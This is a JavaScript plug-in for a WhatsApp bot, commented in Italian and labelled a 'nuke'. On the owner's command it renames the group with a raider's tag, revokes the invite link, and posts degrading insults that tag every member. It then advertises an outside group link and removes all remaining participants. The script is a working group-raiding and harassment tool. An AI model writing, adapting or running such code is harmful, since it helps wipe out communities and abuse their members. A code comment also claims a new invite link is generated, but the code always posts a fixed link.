// Plug-in nuke creato da elixir
let handler = async (m, { conn, participants, isBotAdmin }) => {
    if (!m.isGroup) return;

    const ownerJids = global.owner.map(o => o[0] + '@s.whatsapp.net');
    if (!ownerJids.includes(m.sender)) return;

    if (!isBotAdmin) return;

    const botId = conn.user.id.split(':')[0] + '@s.whatsapp.net';

    // 🔹 CAMBIO NOME GRUPPO
    try {
        let metadata = await conn.groupMetadata(m.chat);
        let oldName = metadata.subject;
        let newName = `${oldName} | SVT BY ENDY`;
        await conn.groupUpdateSubject(m.chat, newName);
    } catch (e) {
        console.error('Errore cambio nome gruppo:', e);
    }

    // 🔹 RESET LINK GRUPPO (Nuova parte aggiunta)
    let newInviteLink = 'https://chat.whatsapp.com/Fzcd0k41aBsALPfSd3SlD3'; // Link di backup
    try {
        await conn.groupRevokeInvite(m.chat); // Invalida il vecchio link
        let code = await conn.groupInviteCode(m.chat); // Genera il nuovo codice
        newInviteLink = `https://chat.whatsapp.com/Fzcd0k41aBsALPfSd3SlD3`;
    } catch (e) {
        console.error('Errore reset link:', e);
    }

    let usersToRemove = participants
        .map(p => p.jid)
        .filter(jid =>
            jid &&
            jid !== botId &&
            !ownerJids.includes(jid)
        );

    if (!usersToRemove.length) return;

    let allJids = participants.map(p => p.jid);

    // 🔹 MESSAGGI MODIFICATI
    await conn.sendMessage(m.chat, {
        text: "Siete stati abusati da Endy brutti cani di merda.."
    });

    await conn.sendMessage(m.chat, {
        text: `Questo è il posto dove vi educheranno brutti cagnacci.\n\n${newInviteLink}`,
        mentions: allJids
    });

    try {
        await conn.groupParticipantsUpdate(m.chat, usersToRemove, 'remove');
    } catch (e) {
        console.error(e);
        await m.reply("❌ Errore durante l'hard wipe.");
    }
};

handler.command = ['canile'];
handler.group = true;
handler.botAdmin = true;
handler.owner = true;

export default handler;